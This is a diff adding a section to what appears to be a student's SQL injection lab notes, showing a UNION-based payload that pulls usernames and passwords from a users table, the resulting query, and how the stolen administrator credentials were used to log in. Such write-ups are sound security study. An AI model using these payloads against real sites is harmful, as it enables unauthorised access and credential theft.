@@ -37,3 +37,21 @@ AND password = 'test123';
 
 The payload comments out the password check.
 This allows login as administrator without the correct password.
+
+## Lab 3 – UNION Attack: Retrieve Data from Other Tables
+
+**Status:** Solved
+
+**Payload:**
+`Gifts' UNION SELECT username,password FROM users--`
+
+**SQL Query:**
+```sql
+SELECT name, description FROM products
+WHERE category = 'Gifts'
+UNION SELECT username, password FROM users--';
+```
+
+**Explanation:**
+
+The UNION SELECT combines product results with data from the users table. This exposed the administrator credentials, which were used to log in.
